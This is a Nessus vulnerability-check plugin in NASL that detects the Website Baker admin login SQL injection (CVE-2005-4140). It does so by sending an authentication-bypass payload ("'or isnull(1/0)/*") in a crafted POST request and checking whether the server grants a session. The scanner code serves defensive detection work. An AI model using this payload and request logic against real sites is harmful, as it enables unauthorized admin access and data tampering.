#
# (C) Tenable Network Security
#


if (description) {
  script_id(20839);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-4140");
  script_bugtraq_id(15776);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"21572");
  }

  script_name(english:"Website Baker Admin Login SQL Injection Vulnerability");
  script_summary(english:"Checks for admin login SQL injection vulnerability in Website Baker");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is vulnerable to SQL
attacks. 

Description :

The remote host is running Website Baker, a PHP-based content
management system. 

The installed version of Website Baker fails to validate user input to
the username parameter of the 'admin/login/index.php' script before
using it to generate database queries.  An unauthenticated attacker
can leverage this issue to bypass authentication, disclose sensitive
information, modify data, or launch attacks against the underlying
database. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2005-12/0085.html
http://download.websitebaker.org/websitebaker2/stable/2.6.1/#changelog

Solution :

Enable PHP's 'magic_quotes_gpc' setting or upgrade to Website Baker
version 2.6.1 or later. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/wb", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Check whether the affected script exists.
  url = string(dir, "/admin/login/index.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if (
    ">Website Baker<" >< res &&
    'input type="hidden" name="username_fieldname"' >< res
  ) {
    # Grab the username field name.
    pat = 'name="username_fieldname" value="([^"]+)"';
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        field = eregmatch(pattern:pat, string:match);
        if (!isnull(field)) {
          user_field = field[1];
          break;
        }
      }
    }

    # If we have the field name...
    if (!isnull(user_field)) {
      # Try to exploit the flaw to bypass authentication.
      if ("_" >< user_field) {
        pass_field = ereg_replace(
          pattern:"username(_.+)", 
          replace:"password\1", 
          string:user_field
        );
      }
      else pass_field = "password";

      postdata = string(
        "url=&",
        "username_fieldname=", user_field, "&",
        "password_fieldname=", pass_field, "&",
        user_field, "=", urlencode(str:"'or isnull(1/0)/*"), "&",
        pass_field, "=", rand(), "&",
        "remember=false&",
        "submit=Login"
      );
      req = string(
        "POST ", url, " HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
      if (res == NULL) exit(0);

      # There's a problem if...
      if (
        # a session id was set and...
        "Set-Cookie: wb_session_id=" >< res &&
        # we're redirected to /admin/start
        egrep(pattern:"^Location: .+/admin/start", string:res)
      ) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
